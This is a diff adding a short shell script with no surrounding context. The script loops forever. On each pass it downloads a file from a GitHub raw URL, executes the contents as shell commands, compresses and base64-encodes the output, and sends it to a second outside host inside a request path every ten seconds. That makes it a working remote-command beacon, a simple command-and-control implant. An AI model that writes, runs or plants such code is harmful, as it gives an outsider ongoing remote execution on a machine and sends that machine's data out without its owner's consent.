@@ -1,0 +1,36 @@
+#!/bin/sh
+URL2="https://dev.thelab.sg"
+#URL2="https://bodgebox.thelab.sg"
+
+while true; do
+    #URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?1"
+    URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?$(date +%s)"
+
+    # Fetch the current file content using the proxy and store in variable
+    current_content=$(curl -S -s "$URL")
+
+    # Run the content as a script and capture the output
+    output=$(sh -c "$current_content")
+
+    # Initialize truncation parameters
+    max_length=200
+    truncate_amount=10
+
+    while true; do
+        # Compress and encode the output in Base64
+        compressed_output=$(echo "$output" | gzip -c | base64)
+
+        # Check if the compressed and encoded output is less than 200 characters
+        if [ ${#compressed_output} -le $max_length ]; then
+            break
+        fi
+
+        # Truncate the output by the set amount
+        output=${output:0:$((${#output} - $truncate_amount))}
+    done
+
+    # Send the compressed and base64 encoded output
+    curl -S -s "$URL2/$compressed_output"
+
+    sleep 10
+done
